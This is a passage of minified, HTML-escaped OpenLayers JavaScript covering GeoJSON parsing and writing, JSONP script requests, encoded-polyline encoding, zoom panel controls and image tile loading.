"Feature":try&#123;d.push(this.parseFeature(e))&#125;catch(h)&#123;d=null,OpenLayers.Console.error(h)&#125;break;case "FeatureCollection":a=0;for(b=e.features.length;a&lt;b;++a)try&#123;d.push(this.parseFeature(e.features[a]))&#125;catch(k)&#123;d=null,OpenLayers.Console.error(k)&#125;break;default:try&#123;var l=this.parseGeometry(e);d.push(new OpenLayers.Feature.Vector(l))&#125;catch(m)&#123;d=null,OpenLayers.Console.error(m)&#125;&#125;&#125;return d&#125;,isValidType:function(a,b)&#123;var c=!1;switch(b)&#123;case "Geometry":-1==OpenLayers.Util.indexOf("Point MultiPoint LineString MultiLineString Polygon MultiPolygon Box GeometryCollection".split(" "),a.type)?OpenLayers.Console.error("Unsupported geometry type: "+a.type):c=!0;break;case "FeatureCollection":c=!0;break;default:a.type==b?c=!0:OpenLayers.Console.error("Cannot convert types from "+a.type+" to "+b)&#125;return c&#125;,parseFeature:function(a)&#123;var b,c,d;c=a.properties?a.properties:&#123;&#125;;d=a.geometry&amp;&amp;a.geometry.bbox||a.bbox;try&#123;b=this.parseGeometry(a.geometry)&#125;catch(e)&#123;throw e;&#125;b=new OpenLayers.Feature.Vector(b,c);d&amp;&amp;(b.bounds=OpenLayers.Bounds.fromArray(d));a.id&amp;&amp;(b.fid=a.id);return b&#125;,parseGeometry:function(a)&#123;if(null==a)return null;var b,c=!1;if("GeometryCollection"==a.type)&#123;if(!OpenLayers.Util.isArray(a.geometries))throw"GeometryCollection must have geometries array: "+a;b=a.geometries.length;for(var c=Array(b),d=0;d&lt;b;++d)c[d]=this.parseGeometry.apply(this,[a.geometries[d]]);b=new OpenLayers.Geometry.Collection(c);c=!0&#125;else&#123;if(!OpenLayers.Util.isArray(a.coordinates))throw"Geometry must have coordinates array: "+a;if(!this.parseCoords[a.type.toLowerCase()])throw"Unsupported geometry type: "+a.type;try&#123;b=this.parseCoords[a.type.toLowerCase()].apply(this,[a.coordinates])&#125;catch(e)&#123;throw e;&#125;&#125;this.internalProjection&amp;&amp;(this.externalProjection&amp;&amp;!c)&amp;&amp;b.transform(this.externalProjection,this.internalProjection);return b&#125;,parseCoords:&#123;point:function(a)&#123;if(!1==this.ignoreExtraDims&amp;&amp;2!=a.length)throw"Only 2D points are supported: "+a;return new OpenLayers.Geometry.Point(a[0],a[1])&#125;,multipoint:function(a)&#123;for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d)&#123;try&#123;c=this.parseCoords.point.apply(this,[a[d]])&#125;catch(f)&#123;throw f;&#125;b.push(c)&#125;return new OpenLayers.Geometry.MultiPoint(b)&#125;,linestring:function(a)&#123;for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d)&#123;try&#123;c=this.parseCoords.point.apply(this,[a[d]])&#125;catch(f)&#123;throw f;&#125;b.push(c)&#125;return new OpenLayers.Geometry.LineString(b)&#125;,multilinestring:function(a)&#123;for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d)&#123;try&#123;c=this.parseCoords.linestring.apply(this,[a[d]])&#125;catch(f)&#123;throw f;&#125;b.push(c)&#125;return new OpenLayers.Geometry.MultiLineString(b)&#125;,polygon:function(a)&#123;for(var b=[],c,d,e=0,f=a.length;e&lt;f;++e)&#123;try&#123;d=this.parseCoords.linestring.apply(this,[a[e]])&#125;catch(g)&#123;throw g;&#125;c=new OpenLayers.Geometry.LinearRing(d.components);b.push(c)&#125;return new OpenLayers.Geometry.Polygon(b)&#125;,multipolygon:function(a)&#123;for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d)&#123;try&#123;c=this.parseCoords.polygon.apply(this,[a[d]])&#125;catch(f)&#123;throw f;&#125;b.push(c)&#125;return new OpenLayers.Geometry.MultiPolygon(b)&#125;,box:function(a)&#123;if(2!=a.length)throw"GeoJSON box coordinates must have 2 elements";return new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing([new OpenLayers.Geometry.Point(a[0][0],a[0][1]),new OpenLayers.Geometry.Point(a[1][0],a[0][1]),new OpenLayers.Geometry.Point(a[1][0],a[1][1]),new OpenLayers.Geometry.Point(a[0][0],a[1][1]),new OpenLayers.Geometry.Point(a[0][0],a[0][1])])])&#125;&#125;,write:function(a,b)&#123;var c=&#123;type:null&#125;;if(OpenLayers.Util.isArray(a))&#123;c.type="FeatureCollection";var d=a.length;c.features=Array(d);for(var e=0;e&lt;d;++e)&#123;var f=a[e];if(!f instanceof OpenLayers.Feature.Vector)throw"FeatureCollection only supports collections of features: "+f;c.features[e]=this.extract.feature.apply(this,[f])&#125;&#125;else 0==a.CLASS_NAME.indexOf("OpenLayers.Geometry")?c=this.extract.geometry.apply(this,[a]):a instanceof OpenLayers.Feature.Vector&amp;&amp;(c=this.extract.feature.apply(this,[a]),a.layer&amp;&amp;a.layer.projection&amp;&amp;(c.crs=this.createCRSObject(a)));return OpenLayers.Format.JSON.prototype.write.apply(this,[c,b])&#125;,createCRSObject:function(a)&#123;a=a.layer.projection.toString();var b=&#123;&#125;;a.match(/epsg:/i)&amp;&amp;(a=parseInt(a.substring(a.indexOf(":")+1)),b=4326==a?&#123;type:"name",properties:&#123;name:"urn:ogc:def:crs:OGC:1.3:CRS84"&#125;&#125;:&#123;type:"name",properties:&#123;name:"EPSG:"+a&#125;&#125;);return b&#125;,extract:&#123;feature:function(a)&#123;var b=this.extract.geometry.apply(this,[a.geometry]),b=&#123;type:"Feature",properties:a.attributes,geometry:b&#125;;null!=a.fid&amp;&amp;(b.id=a.fid);return b&#125;,geometry:function(a)&#123;if(null==a)return null;this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b=a.CLASS_NAME.split(".")[2];a=this.extract[b.toLowerCase()].apply(this,[a]);return"Collection"==b?&#123;type:"GeometryCollection",geometries:a&#125;:&#123;type:b,coordinates:a&#125;&#125;,point:function(a)&#123;return[a.x,a.y]&#125;,multipoint:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b&#125;,linestring:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b&#125;,multilinestring:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.linestring.apply(this,[a.components[c]]));return b&#125;,polygon:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.linestring.apply(this,[a.components[c]]));return b&#125;,multipolygon:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.polygon.apply(this,[a.components[c]]));return b&#125;,collection:function(a)&#123;for(var b=a.components.length,c=Array(b),d=0;d&lt;b;++d)c[d]=this.extract.geometry.apply(this,[a.components[d]]);return c&#125;&#125;,CLASS_NAME:"OpenLayers.Format.GeoJSON"&#125;);OpenLayers.Protocol.Script=OpenLayers.Class(OpenLayers.Protocol,&#123;url:null,params:null,callback:null,callbackTemplate:"OpenLayers.Protocol.Script.registry.$&#123;id&#125;",callbackKey:"callback",callbackPrefix:"",scope:null,format:null,pendingRequests:null,srsInBBOX:!1,initialize:function(a)&#123;a=a||&#123;&#125;;this.params=&#123;&#125;;this.pendingRequests=&#123;&#125;;OpenLayers.Protocol.prototype.initialize.apply(this,arguments);this.format||(this.format=new OpenLayers.Format.GeoJSON);if(!this.filterToParams&amp;&amp;OpenLayers.Format.QueryStringFilter)&#123;var b=new OpenLayers.Format.QueryStringFilter(&#123;srsInBBOX:this.srsInBBOX&#125;);this.filterToParams=function(a,d)&#123;return b.write(a,d)&#125;&#125;&#125;,read:function(a)&#123;OpenLayers.Protocol.prototype.read.apply(this,arguments);a=OpenLayers.Util.applyDefaults(a,this.options);a.params=OpenLayers.Util.applyDefaults(a.params,this.options.params);a.filter&amp;&amp;this.filterToParams&amp;&amp;(a.params=this.filterToParams(a.filter,a.params));var b=new OpenLayers.Protocol.Response(&#123;requestType:"read"&#125;),c=this.createRequest(a.url,a.params,OpenLayers.Function.bind(function(c)&#123;b.data=c;this.handleRead(b,a)&#125;,this));b.priv=c;return b&#125;,createRequest:function(a,b,c)&#123;c=OpenLayers.Protocol.Script.register(c);var d=OpenLayers.String.format(this.callbackTemplate,&#123;id:c&#125;);b=OpenLayers.Util.extend(&#123;&#125;,b);b[this.callbackKey]=this.callbackPrefix+d;a=OpenLayers.Util.urlAppend(a,OpenLayers.Util.getParameterString(b));b=document.createElement("script");b.type="text/javascript";b.src=a;b.id="OpenLayers_Protocol_Script_"+c;this.pendingRequests[b.id]=b;document.getElementsByTagName("head")[0].appendChild(b);return b&#125;,destroyRequest:function(a)&#123;OpenLayers.Protocol.Script.unregister(a.id.split("_").pop());delete this.pendingRequests[a.id];a.parentNode&amp;&amp;a.parentNode.removeChild(a)&#125;,handleRead:function(a,b)&#123;this.handleResponse(a,b)&#125;,handleResponse:function(a,b)&#123;b.callback&amp;&amp;(a.data?(a.features=this.parseFeatures(a.data),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE,this.destroyRequest(a.priv),b.callback.call(b.scope,a))&#125;,parseFeatures:function(a)&#123;return this.format.read(a)&#125;,abort:function(a)&#123;if(a)this.destroyRequest(a.priv);else for(var b in this.pendingRequests)this.destroyRequest(this.pendingRequests[b])&#125;,destroy:function()&#123;this.abort();delete this.params;delete this.format;OpenLayers.Protocol.prototype.destroy.apply(this)&#125;,CLASS_NAME:"OpenLayers.Protocol.Script"&#125;);(function()&#123;var a=OpenLayers.Protocol.Script,b=0;a.registry=&#123;&#125;;a.register=function(c)&#123;var d="c"+ ++b;a.registry[d]=function()&#123;c.apply(this,arguments)&#125;;return d&#125;;a.unregister=function(b)&#123;delete a.registry[b]&#125;&#125;)();OpenLayers.Format.EncodedPolyline=OpenLayers.Class(OpenLayers.Format,&#123;geometryType:"linestring",initialize:function(a)&#123;OpenLayers.Format.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;var b;if("linestring"==this.geometryType)b=OpenLayers.Geometry.LineString;else if("linearring"==this.geometryType)b=OpenLayers.Geometry.LinearRing;else if("multipoint"==this.geometryType)b=OpenLayers.Geometry.MultiPoint;else if("point"!=this.geometryType&amp;&amp;"polygon"!=this.geometryType)return null;a=this.decodeDeltas(a,2);for(var c=a.length,d=[],e=0;e+1&lt;c;)&#123;var f=a[e++],g=a[e++];d.push(new OpenLayers.Geometry.Point(g,f))&#125;return"point"==this.geometryType?new OpenLayers.Feature.Vector(d[0]):"polygon"==this.geometryType?new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])):new OpenLayers.Feature.Vector(new b(d))&#125;,decode:function(a,b,c)&#123;a=this.decodeDeltas(a,b,c||1E5);c=a.length;for(var d=[],e=0;e+(b-1)&lt;c;)&#123;for(var f=[],g=0;g&lt;b;++g)f.push(a[e++]);d.push(f)&#125;return d&#125;,write:function(a)&#123;a=(a.constructor==Array?a[0]:a).geometry;var b=a.CLASS_NAME.split(".")[2].toLowerCase();if("point"==b)a=Array(a);else if("linestring"==b||"linearring"==b||"multipoint"==b)a=a.components;else if("polygon"==b)a=a.components[0].components;else return null;for(var b=[],c=a.length,d=0;d&lt;c;++d)&#123;var e=a[d];b.push(e.y);b.push(e.x)&#125;return this.encodeDeltas(b,2)&#125;,encode:function(a,b,c)&#123;c=c||1E5;for(var d=[],e=a.length,f=0;f&lt;e;++f)for(var g=a[f],h=0;h&lt;b;++h)d.push(g[h]);return this.encodeDeltas(d,b,c)&#125;,encodeDeltas:function(a,b,c)&#123;var d,e=Array(b);for(d=0;d&lt;b;++d)e[d]=0;for(var f=a.length,g=0;g&lt;f;)for(d=0;d&lt;b;++d,++g)&#123;var h=a[g],k=h-e[d];e[d]=h;a[g]=k&#125;return this.encodeFloats(a,c||1E5)&#125;,decodeDeltas:function(a,b,c)&#123;var d,e=Array(b);for(d=0;d&lt;b;++d)e[d]=0;a=this.decodeFloats(a,c||1E5);c=a.length;for(var f=0;f&lt;c;)for(d=0;d&lt;b;++d,++f)e[d]+=a[f],a[f]=e[d];return a&#125;,encodeFloats:function(a,b)&#123;for(var c=b||1E5,d=a.length,e=0;e&lt;d;++e)a[e]=Math.round(a[e]*c);return this.encodeSignedIntegers(a)&#125;,decodeFloats:function(a,b)&#123;for(var c=b||1E5,d=this.decodeSignedIntegers(a),e=d.length,f=0;f&lt;e;++f)d[f]/=c;return d&#125;,encodeSignedIntegers:function(a)&#123;for(var b=a.length,c=0;c&lt;b;++c)&#123;var d=a[c],e=d&lt;&lt;1;0&gt;d&amp;&amp;(e=~e);a[c]=e&#125;return this.encodeUnsignedIntegers(a)&#125;,decodeSignedIntegers:function(a)&#123;a=this.decodeUnsignedIntegers(a);for(var b=a.length,c=0;c&lt;b;++c)&#123;var d=a[c];a[c]=d&amp;1?~(d&gt;&gt;1):d&gt;&gt;1&#125;return a&#125;,encodeUnsignedIntegers:function(a)&#123;for(var b="",c=a.length,d=0;d&lt;c;++d)b+=this.encodeUnsignedInteger(a[d]);return b&#125;,decodeUnsignedIntegers:function(a)&#123;for(var b=[],c=0,d=0,e=a.length,f=0;f&lt;e;++f)&#123;var g=a.charCodeAt(f)-63,c=c|(g&amp;31)&lt;&lt;d;32&gt;g?(b.push(c),d=c=0):d+=5&#125;return b&#125;,encodeFloat:function(a,b)&#123;a=Math.round(a*(b||1E5));return this.encodeSignedInteger(a)&#125;,decodeFloat:function(a,b)&#123;return this.decodeSignedInteger(a)/(b||1E5)&#125;,encodeSignedInteger:function(a)&#123;var b=a&lt;&lt;1;0&gt;a&amp;&amp;(b=~b);return this.encodeUnsignedInteger(b)&#125;,decodeSignedInteger:function(a)&#123;a=this.decodeUnsignedInteger(a);return a&amp;1?~(a&gt;&gt;1):a&gt;&gt;1&#125;,encodeUnsignedInteger:function(a)&#123;for(var b,c="";32&lt;=a;)b=(32|a&amp;31)+63,c+=String.fromCharCode(b),a&gt;&gt;=5;return c+=String.fromCharCode(a+63)&#125;,decodeUnsignedInteger:function(a)&#123;for(var b=0,c=0,d=a.length,e=0;e&lt;d;++e)&#123;var f=a.charCodeAt(e)-63,b=b|(f&amp;31)&lt;&lt;c;if(32&gt;f)break;c+=5&#125;return b&#125;,CLASS_NAME:"OpenLayers.Format.EncodedPolyline"&#125;);OpenLayers.Control.Panel=OpenLayers.Class(OpenLayers.Control,&#123;controls:null,autoActivate:!0,defaultControl:null,saveState:!1,allowDepress:!1,activeState:null,initialize:function(a)&#123;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.controls=[];this.activeState=&#123;&#125;&#125;,destroy:function()&#123;this.map&amp;&amp;this.map.events.unregister("buttonclick",this,this.onButtonClick);OpenLayers.Control.prototype.destroy.apply(this,arguments);for(var a,b=this.controls.length-1;0&lt;=b;b--)a=this.controls[b],a.events&amp;&amp;a.events.un(&#123;activate:this.iconOn,deactivate:this.iconOff&#125;),a.panel_div=null;this.activeState=null&#125;,activate:function()&#123;if(OpenLayers.Control.prototype.activate.apply(this,arguments))&#123;for(var a,b=0,c=this.controls.length;b&lt;c;b++)a=this.controls[b],(a===this.defaultControl||this.saveState&amp;&amp;this.activeState[a.id])&amp;&amp;a.activate();!0===this.saveState&amp;&amp;(this.defaultControl=null);this.redraw();return!0&#125;return!1&#125;,deactivate:function()&#123;if(OpenLayers.Control.prototype.deactivate.apply(this,arguments))&#123;for(var a,b=0,c=this.controls.length;b&lt;c;b++)a=this.controls[b],this.activeState[a.id]=a.deactivate();this.redraw();return!0&#125;return!1&#125;,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);this.outsideViewport?(this.events.attachToElement(this.div),this.events.register("buttonclick",this,this.onButtonClick)):this.map.events.register("buttonclick",this,this.onButtonClick);this.addControlsToMap(this.controls);return this.div&#125;,redraw:function()&#123;for(var a=this.div.childNodes.length-1;0&lt;=a;a--)this.div.removeChild(this.div.childNodes[a]);this.div.innerHTML="";if(this.active)for(var a=0,b=this.controls.length;a&lt;b;a++)this.div.appendChild(this.controls[a].panel_div)&#125;,activateControl:function(a)&#123;if(!this.active)return!1;if(a.type==OpenLayers.Control.TYPE_BUTTON)a.trigger();else if(a.type==OpenLayers.Control.TYPE_TOGGLE)a.active?a.deactivate():a.activate();else if(this.allowDepress&amp;&amp;a.active)a.deactivate();else&#123;for(var b,c=0,d=this.controls.length;c&lt;d;c++)b=this.controls[c],b==a||b.type!==OpenLayers.Control.TYPE_TOOL&amp;&amp;null!=b.type||b.deactivate();a.activate()&#125;&#125;,addControls:function(a)&#123;OpenLayers.Util.isArray(a)||(a=[a]);this.controls=this.controls.concat(a);for(var b=0,c=a.length;b&lt;c;b++)&#123;var d=a[b],e=this.createControlMarkup(d);OpenLayers.Element.addClass(e,d.displayClass+"ItemInactive");OpenLayers.Element.addClass(e,"olButton");""==d.title||e.title||(e.title=d.title);d.panel_div=e&#125;this.map&amp;&amp;(this.addControlsToMap(a),this.redraw())&#125;,createControlMarkup:function(a)&#123;return document.createElement("div")&#125;,addControlsToMap:function(a)&#123;for(var b,c=0,d=a.length;c&lt;d;c++)b=a[c],!0===b.autoActivate?(b.autoActivate=!1,this.map.addControl(b),b.autoActivate=!0):(this.map.addControl(b),b.deactivate()),b.events.on(&#123;activate:this.iconOn,deactivate:this.iconOff&#125;)&#125;,iconOn:function()&#123;var a=this.panel_div;a.className=a.className.replace(RegExp("\\b("+this.displayClass+"Item)Inactive\\b"),"$1Active")&#125;,iconOff:function()&#123;var a=this.panel_div;a.className=a.className.replace(RegExp("\\b("+this.displayClass+"Item)Active\\b"),"$1Inactive")&#125;,onButtonClick:function(a)&#123;var b=this.controls;a=a.buttonElement;for(var c=b.length-1;0&lt;=c;--c)if(b[c].panel_div===a)&#123;this.activateControl(b[c]);break&#125;&#125;,getControlsBy:function(a,b)&#123;var c="function"==typeof b.test;return OpenLayers.Array.filter(this.controls,function(d)&#123;return d[a]==b||c&amp;&amp;b.test(d[a])&#125;)&#125;,getControlsByName:function(a)&#123;return this.getControlsBy("name",a)&#125;,getControlsByClass:function(a)&#123;return this.getControlsBy("CLASS_NAME",a)&#125;,CLASS_NAME:"OpenLayers.Control.Panel"&#125;);OpenLayers.Control.Button=OpenLayers.Class(OpenLayers.Control,&#123;type:OpenLayers.Control.TYPE_BUTTON,trigger:function()&#123;&#125;,CLASS_NAME:"OpenLayers.Control.Button"&#125;);OpenLayers.Control.ZoomIn=OpenLayers.Class(OpenLayers.Control.Button,&#123;trigger:function()&#123;this.map&amp;&amp;this.map.zoomIn()&#125;,CLASS_NAME:"OpenLayers.Control.ZoomIn"&#125;);OpenLayers.Control.ZoomOut=OpenLayers.Class(OpenLayers.Control.Button,&#123;trigger:function()&#123;this.map&amp;&amp;this.map.zoomOut()&#125;,CLASS_NAME:"OpenLayers.Control.ZoomOut"&#125;);OpenLayers.Control.ZoomToMaxExtent=OpenLayers.Class(OpenLayers.Control.Button,&#123;trigger:function()&#123;this.map&amp;&amp;this.map.zoomToMaxExtent()&#125;,CLASS_NAME:"OpenLayers.Control.ZoomToMaxExtent"&#125;);OpenLayers.Control.ZoomPanel=OpenLayers.Class(OpenLayers.Control.Panel,&#123;initialize:function(a)&#123;OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);this.addControls([new OpenLayers.Control.ZoomIn,new OpenLayers.Control.ZoomToMaxExtent,new OpenLayers.Control.ZoomOut])&#125;,CLASS_NAME:"OpenLayers.Control.ZoomPanel"&#125;);OpenLayers.Layer.HTTPRequest=OpenLayers.Class(OpenLayers.Layer,&#123;URL_HASH_FACTOR:(Math.sqrt(5)-1)/2,url:null,params:null,reproject:!1,initialize:function(a,b,c,d)&#123;OpenLayers.Layer.prototype.initialize.apply(this,[a,d]);this.url=b;this.params||(this.params=OpenLayers.Util.extend(&#123;&#125;,c))&#125;,destroy:function()&#123;this.params=this.url=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.HTTPRequest(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.prototype.clone.apply(this,[a])&#125;,setUrl:function(a)&#123;this.url=a&#125;,mergeNewParams:function(a)&#123;this.params=OpenLayers.Util.extend(this.params,a);a=this.redraw();null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",&#123;layer:this,property:"params"&#125;);return a&#125;,redraw:function(a)&#123;return a?this.mergeNewParams(&#123;_olSalt:Math.random()&#125;):OpenLayers.Layer.prototype.redraw.apply(this,[])&#125;,selectUrl:function(a,b)&#123;for(var c=1,d=0,e=a.length;d&lt;e;d++)c*=a.charCodeAt(d)*this.URL_HASH_FACTOR,c-=Math.floor(c);return b[Math.floor(c*b.length)]&#125;,getFullRequestString:function(a,b)&#123;var c=b||this.url,d=OpenLayers.Util.extend(&#123;&#125;,this.params),d=OpenLayers.Util.extend(d,a),e=OpenLayers.Util.getParameterString(d);OpenLayers.Util.isArray(c)&amp;&amp;(c=this.selectUrl(e,c));var e=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),f;for(f in d)f.toUpperCase()in e&amp;&amp;delete d[f];e=OpenLayers.Util.getParameterString(d);return OpenLayers.Util.urlAppend(c,e)&#125;,CLASS_NAME:"OpenLayers.Layer.HTTPRequest"&#125;);OpenLayers.Tile=OpenLayers.Class(&#123;events:null,eventListeners:null,id:null,layer:null,url:null,bounds:null,size:null,position:null,isLoading:!1,initialize:function(a,b,c,d,e,f)&#123;this.layer=a;this.position=b.clone();this.setBounds(c);this.url=d;e&amp;&amp;(this.size=e.clone());this.id=OpenLayers.Util.createUniqueID("Tile_");OpenLayers.Util.extend(this,f);this.events=new OpenLayers.Events(this);if(this.eventListeners instanceof Object)this.events.on(this.eventListeners)&#125;,unload:function()&#123;this.isLoading&amp;&amp;(this.isLoading=!1,this.events.triggerEvent("unload"))&#125;,destroy:function()&#123;this.position=this.size=this.bounds=this.layer=null;this.eventListeners&amp;&amp;this.events.un(this.eventListeners);this.events.destroy();this.events=this.eventListeners=null&#125;,draw:function(a)&#123;a||this.clear();var b=this.shouldDraw();b&amp;&amp;(!a&amp;&amp;!1===this.events.triggerEvent("beforedraw"))&amp;&amp;(b=null);return b&#125;,shouldDraw:function()&#123;var a=!1,b=this.layer.maxExtent;if(b)&#123;var c=this.layer.map,c=c.baseLayer.wrapDateLine&amp;&amp;c.getMaxExtent();this.bounds.intersectsBounds(b,&#123;inclusive:!1,worldBounds:c&#125;)&amp;&amp;(a=!0)&#125;return a||this.layer.displayOutsideMaxExtent&#125;,setBounds:function(a)&#123;a=a.clone();if(this.layer.map.baseLayer.wrapDateLine)&#123;var b=this.layer.map.getMaxExtent(),c=this.layer.map.getResolution();a=a.wrapDateLine(b,&#123;leftTolerance:c,rightTolerance:c&#125;)&#125;this.bounds=a&#125;,moveTo:function(a,b,c)&#123;null==c&amp;&amp;(c=!0);this.setBounds(a);this.position=b.clone();c&amp;&amp;this.draw()&#125;,clear:function(a)&#123;&#125;,CLASS_NAME:"OpenLayers.Tile"&#125;);OpenLayers.Tile.Image=OpenLayers.Class(OpenLayers.Tile,&#123;url:null,imgDiv:null,frame:null,imageReloadAttempts:null,layerAlphaHack:null,asyncRequestId:null,maxGetUrlLength:null,canvasContext:null,crossOriginKeyword:null,initialize:function(a,b,c,d,e,f)&#123;OpenLayers.Tile.prototype.initialize.apply(this,arguments);this.url=d;this.layerAlphaHack=this.layer.alpha&amp;&amp;OpenLayers.Util.alphaHack();if(null!=this.maxGetUrlLength||this.layer.gutter||this.layerAlphaHack)this.frame=document.createElement("div"),this.frame.style.position="absolute",this.frame.style.overflow="hidden";null!=this.maxGetUrlLength&amp;&amp;OpenLayers.Util.extend(this,OpenLayers.Tile.Image.IFrame)&#125;,destroy:function()&#123;this.imgDiv&amp;&amp;(this.clear(),this.frame=this.imgDiv=null);this.asyncRequestId=null;OpenLayers.Tile.prototype.destroy.apply(this,arguments)&#125;,draw:function()&#123;var a=OpenLayers.Tile.prototype.draw.apply(this,arguments);a?(this.layer!=this.layer.map.baseLayer&amp;&amp;this.layer.reproject&amp;&amp;(this.bounds=this.getBoundsFromBaseLayer(this.position)),this.isLoading?this._loadEvent="reload":(this.isLoading=!0,this._loadEvent="loadstart"),this.renderTile(),this.positionTile()):!1===a&amp;&amp;this.unload();return a&#125;,renderTile:function()&#123;if(this.layer.async)&#123;var a=this.asyncRequestId=(this.asyncRequestId||0)+1;this.layer.getURLasync(this.bounds,function(b)&#123;a==this.asyncRequestId&amp;&amp;(this.url=b,this.initImage())&#125;,this)&#125;else this.url=this.layer.getURL(this.bounds),this.initImage()&#125;,positionTile:function()&#123;var a=this.getTile().style,b=this.frame?this.size:this.layer.getImageSize(this.bounds),c=1;this.layer instanceof OpenLayers.Layer.Grid&amp;&amp;(c=this.layer.getServerResolution()/this.layer.map.getResolution());a.left=this.position.x+"px";a.top=this.position.y+"px";a.width=Math.round(c*b.w)+"px";a.height=Math.round(c*b.h)+"px"&#125;,clear:function()&#123;OpenLayers.Tile.prototype.clear.apply(this,arguments);var a=this.imgDiv;if(a)&#123;var b=this.getTile();b.parentNode===this.layer.div&amp;&amp;this.layer.div.removeChild(b);this.setImgSrc();!0===this.layerAlphaHack&amp;&amp;(a.style.filter="");OpenLayers.Element.removeClass(a,"olImageLoadError")&#125;this.canvasContext=null&#125;,getImage:function()&#123;if(!this.imgDiv)&#123;this.imgDiv=OpenLayers.Tile.Image.IMAGE.cloneNode(!1);var a=this.imgDiv.style;if(this.frame)&#123;var b=0,c=0;this.layer.gutter&amp;&amp;(b=100*(this.layer.gutter/this.layer.tileSize.w),c=100*(this.layer.gutter/this.layer.tileSize.h));a.left=-b+"%";a.top=-c+"%";a.width=2*b+100+"%";a.height=2*c+100+"%"&#125;a.visibility="hidden";a.opacity=0;1&gt;this.layer.opacity&amp;&amp;(a.filter="alpha(opacity="+100*this.layer.opacity+")");a.position="absolute";this.layerAlphaHack&amp;&amp;(a.paddingTop=a.height,a.height="0",a.width="100%");this.frame&amp;&amp;this.frame.appendChild(this.imgDiv)&#125;return this.imgDiv&#125;,setImage:function(a)&#123;this.imgDiv=a&#125;,initImage:function()&#123;if(this.url||this.imgDiv)&#123;this.events.triggerEvent("beforeload");this.layer.div.appendChild(this.getTile());this.events.triggerEvent(this._loadEvent);var a=this.getImage(),b=a.getAttribute("src")||"";this.url&amp;&amp;OpenLayers.Util.isEquivalentUrl(b,this.url)?this._loadTimeout=window.setTimeout(OpenLayers.Function.bind(this.onImageLoad,this),0):(this.stopLoading(),this.crossOriginKeyword&amp;&amp;a.removeAttribute("crossorigin"),OpenLayers.Event.observe(a,"load",OpenLayers.Function.bind(this.onImageLoad,this)),OpenLayers.Event.observe(a,"error",OpenLayers.Function.bind(this.onImageError,this)),this.imageReloadAttempts=0,this.setImgSrc(this.url))&#125;else this.isLoading=!1&#125;,setImgSrc:function(a)&#123;var b=this.imgDiv;a?(b.style.visibility="hidden",b.style.opacity=0,this.crossOriginKeyword&amp;&amp;("data:"!==a.substr(0,5)?b.setAttribute("crossorigin",this.crossOriginKeyword):b.removeAttribute("crossorigin")),b.src=a):(this.stopLoading(),this.imgDiv=null,b.parentNode&amp;&amp;b.parentNode.removeChild(b))&#125;,getTile:function()&#123;return this.frame?this.frame:this.getImage()&#125;,createBackBuffer:function()&#123;if(this.imgDiv&amp;&amp;!this.isLoading)&#123;var a;this.frame?(a=this.frame.cloneNode(!1),a.appendChild(this.imgDiv)):a=this.imgDiv;this.imgDiv=null;return a&#125;&#125;,onImageLoad:function()&#123;var a=this.imgDiv;this.stopLoading();a.style.visibility="inherit";a.style.opacity=this.layer.opacity;this.isLoading=!1;this.canvasContext=null;this.events.triggerEvent("loadend");!0===this.layerAlphaHack&amp;&amp;(a.style.filter="progid:DXImageTransform.Microsoft.AlphaImageLoader(src='"+a.src+"', sizingMethod='scale')")&#125;,onImageError:function()&#123;var a=this.imgDiv;null!=a.src&amp;&amp;(this.imageReloadAttempts++,this.imageReloadAttempts&lt;=OpenLayers.IMAGE_RELOAD_ATTEMPTS?this.setImgSrc(this.layer.getURL(this.bounds)):(OpenLayers.Element.addClass(a,"olImageLoadError"),a.onerror=errorImage(a),this.events.triggerEvent("loaderror"),this.onImageLoad()))&#125;,stopLoading:function()&#123;OpenLayers.Event.stopObservingElement(this.imgDiv);window.clearTimeout(this._loadTimeout);delete this._loadTimeout&#125;,getCanvasContext:function()&#123;if(OpenLayers.CANVAS_SUPPORTED&amp;&amp;this.imgDiv&amp;&amp;!this.isLoading)&#123;if(!this.canvasContext)&#123;var a=document.createElement("canvas");a.width=this.size.w;a.height=this.size.h;this.canvasContext=a.getContext("2d");this.canvasContext.drawImage(this.imgDiv,0,0)&#125;return this.canvasContext&#125;&#125;,CLASS_NAME:"OpenLayers.Tile.Image"&#125;);OpenLayers.Tile.Image.IMAGE=function()&#123;var a=new Image;a.className="olTileImage";a.galleryImg="no";return 